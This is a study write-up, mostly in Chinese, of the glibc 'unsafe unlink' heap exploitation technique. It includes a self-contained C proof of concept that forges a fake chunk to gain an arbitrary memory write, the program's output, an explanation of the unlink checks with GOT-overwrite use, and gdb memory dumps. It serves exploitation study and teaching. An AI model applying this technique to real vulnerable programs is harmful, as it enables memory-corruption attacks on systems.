# unsafe_unlink

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

uint64_t *chunk0_ptr;

int main()
{
	setbuf(stdout, NULL);
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);

	// sanity check
	assert(*(long *)victim_string == 0x4141414142424242L);
}
```

**result**

```c
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602078, pointing to 0x2476010
The victim chunk we are going to corrupt is at 0x24760a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602060
Fake chunk bk: 0x602068

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

**analysis**

该trick曾经可以实现任意地址写任意值，但是随着glibc添加新的检查，漏洞依然存在但实现的效果缺发生了变化。首先，看unlink的代码

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (P->size)				      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr (check_action,				      \
			       "corrupted double-linked list (not small)",    \
			       P, AV);					      \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```

## 旧的unlink

在旧的unlink中，并没有size和双向链表的检查。那么unlink操作就相当于执行了以下操作：

```c
FD = P -> fd;
BK = P -> bk;
FD -> bk = BK;
BK -> fd = FD;
```

假设我们在`P -> fd`中写入目标地址：`dest_addr - 0x18`，在`P -> bk`中写入修改的地址（例如某函数的got表地址）`expect_addr`。以上函数相当于：

```c
FD = dest_addr - 0x18;
BK = expect_addr;
*(dest_addr - 0x18 + 0x18) = expect_addr
*(expect_addr + 0x10) = dest_addr - 0x18
```

我们将`expect_addr`写入了`dest_addr`的位置。通过这一点我们可以向任意的位置写任意的值。

## 新的unlink

添加了以下检查机制：

```c
···
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      
      malloc_printerr ("corrupted size vs. prev_size");               
    FD = P->fd;                                                                      
    BK = P->bk;                                                                      
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
    else {                                                                      
        FD->bk = BK;                                                              
        BK->fd = FD;  
···
```

它要求`FD->bk = BK->fd = P`，即`*(P -> fd+0x18)==*(P -> bk+0x10)==P`，所以`*(P -> fd)=P-0x18`，`*(P -> bk)=P-0x10`。

最终实现：

```c
*P=P-0x18
```

此时，再编辑P所指chunk为某got表，就可以对got进行编辑。

应用的场景，存在一个管理堆指针的数组，这个数组我们无法直接操作，但是其P的附近，所以我们可以通过unlink改变其中的值，再将P指向我们想写入的地址（got表），实现任意地址写。

另外，因为我们要修改chunk header,所以需要想办法溢出或UAF。

回到Poc，在全局变量chunk0_ptr存放了一个chunk指针，chunk1_ptr存放了另一个chunk指针。全局变量的位置bss段与堆段相邻。我们在chunk0_ptr中构建fake chunk。

令fake chunk的fd指向fake chunk - 0x18，使`P->fd->bk = P`，0x18是bk在chunk中的偏移。而fake chunk是在chunk0的内部构造的。

接着令fake chunk的bk指向fake chunk - 0x10，使`P->bk->fd = P`，0x10是fd在chunk中的偏移。这样我们就通过了检查。

我们假定可以在chunk0中进行溢出，修改chunk1的prev_size，使chunk1 - prev_size = fake chunk。接着，free(chunk1)程序会认为chunk1前的fake chunk是个free chunk，从而unlink(fake chunk)。但是其实fake chunk不在双向链表中。

chunk0_ptr原本指向了chunk0的mem，现在其指向了chunk0-0x18的位置。之后chunk0_ptr[3]即chunk0_ptr的位置。chunk0_ptr处的指针本来是不能被我们修改的现在，我们通过编辑chunk0_ptr就可以将他修改了。

**gdb**

伪造chunk前，chunk0_ptr指向chunk0的mem

```c
pwndbg> x/gx 0x602078
0x602078 <chunk0_ptr>:	0x0000000000603010
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x603090
Size: 0x91

Top chunk | PREV_INUSE
Addr: 0x603120
Size: 0x20ee1
```

fake chunk

```c
pwndbg> x/10gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000091
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000602060	0x0000000000602068
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
```

修改prev_size

```c
pwndbg> vis 0x603000
0x603000	0x0000000000000000	0x0000000000000091	................
0x603010	0x0000000000000000	0x0000000000000000	................
0x603020	0x0000000000602060	0x0000000000602068	` `.....h `.....
0x603030	0x0000000000000000	0x0000000000000000	................
0x603040	0x0000000000000000	0x0000000000000000	................
0x603050	0x0000000000000000	0x0000000000000000	................
0x603060	0x0000000000000000	0x0000000000000000	................
0x603070	0x0000000000000000	0x0000000000000000	................
0x603080	0x0000000000000000	0x0000000000000000	................
0x603090	0x0000000000000080	0x0000000000000090	................
0x6030a0	0x0000000000000000	0x0000000000000000	................
0x6030b0	0x0000000000000000	0x0000000000000000	................
0x6030c0	0x0000000000000000	0x0000000000000000	................
0x6030d0	0x0000000000000000	0x0000000000000000	................
0x6030e0	0x0000000000000000	0x0000000000000000	................
0x6030f0	0x0000000000000000	0x0000000000000000	................
0x603100	0x0000000000000000	0x0000000000000000	................
0x603110	0x0000000000000000	0x0000000000000000	................
0x603120	0x0000000000000000	0x0000000000020ee1	................	 <-- Top chunk
```

free()

```c
pwndbg> x/gx 0x602078
0x602078 <chunk0_ptr>:	0x0000000000602060
```

修改chunk0_ptr

```c
pwndbg> x/gx 0x602078
0x602078 <chunk0_ptr>:	0x00007fffffffdca0
pwndbg> x/s 0x00007fffffffdca0
0x7fffffffdca0:	"Hello!~"
```

